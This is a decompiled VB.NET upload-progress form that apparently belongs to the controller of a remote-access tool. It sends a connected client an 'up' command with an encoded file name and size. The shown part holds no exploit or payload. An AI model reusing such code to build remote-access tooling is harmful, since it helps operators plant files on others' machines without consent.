Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class FrmUpload
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.FrmUpload_FormClosing)
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.FrmUpload_Load)
        Me.os = 0
        Me.InitializeComponent()
    End Sub
    Public c As MdClient
    Public FNNN As String
    Public FS As FileStream
    Public os As Integer
    Public sk As MdClient
    Public SZ As Integer
    Public TMP As String

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.Lv1.Items.Item(2).SubItems.Item(1).Text = MdFN.Siz(CLng((Me.ProgressBar1.Value - Me.os)))
            Me.os = Me.ProgressBar1.Value
            Me.Lv1.Items.Item(3).SubItems.Item(1).Text = MdFN.Siz(CLng(Me.ProgressBar1.Value))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub

    Private Sub FrmUpload_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.FS.Close()
            Me.FS.Dispose()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub FrmUpload_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.FS = New FileStream(Me.TMP, FileMode.Open)
        Me.Lv1.Items.Item(0).SubItems.Item(1).Text = New FileInfo(Me.TMP).Name
        Me.Lv1.Items.Item(1).SubItems.Item(1).Text = MdFN.Siz(CLng(Me.SZ))
        Me.Lv1.Items.Item(2).SubItems.Item(1).Text = MdFN.Siz(0)
        Me.Lv1.Items.Item(3).SubItems.Item(1).Text = MdFN.Siz(0)
        Me.ProgressBar1.Maximum = Me.SZ
        Me.c.Send(String.Concat(New String() {"up", MdSokserver.Y, Me.c.ip, MdSokserver.Y, MdFN.ENB(Me.FNNN), MdSokserver.Y, Conversions.ToString(Me.SZ)}))
        Me.Lv1.FX()
        Me.Timer1.Enabled = True
    End Sub
End Class